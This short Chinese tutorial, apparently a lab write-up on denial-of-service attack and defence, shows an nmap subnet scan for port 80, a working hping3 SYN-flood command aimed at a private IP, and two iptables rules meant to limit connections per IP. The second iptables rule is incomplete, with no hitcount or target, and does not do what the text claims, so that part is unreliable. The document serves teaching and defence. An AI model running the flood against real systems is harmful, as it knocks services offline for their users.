# DoS攻擊與防護
## 攻擊端
攻擊端先利用nmap掃描啟動中的ip和正在啟用的端口 
```
nmap -O -p 80 192.168.0.* 
```
> 掃描192.168.0.0到192.168.0.255之間port為80的主機

例如找到192.168.0.121有開放80端口後開始使用hping3攻擊開始攻擊 
```
hping3 --flood -S -p 80 -d 120 -v 192.168.0.121 
```
> 利用泛洪方式攻擊192.168.0.121的80端口發送120BYTES大小的syn封包
  
## 防護端
### Linux的iptables
```
iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 10 -j REJECT  
iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --second 6
```
上述兩個指令表達是在6秒內相同IP請求連線次數超過10個即拒絕回應

參考資料: [Linux 下用 iptables 預防 DDOS](https://www.opencli.com/linux/iptables-prevent-ddos)
## 影片說明
本次有實際防範影片，駭客用上述hping3的攻擊指令導致Http Server無法服務，但伺服器有在防火牆上做上述過濾規則，導致只有駭客IP被回絕的成效。   
成果影片：[DoS防護](https://www.youtube.com/watch?v=ivcXCg2x05o)
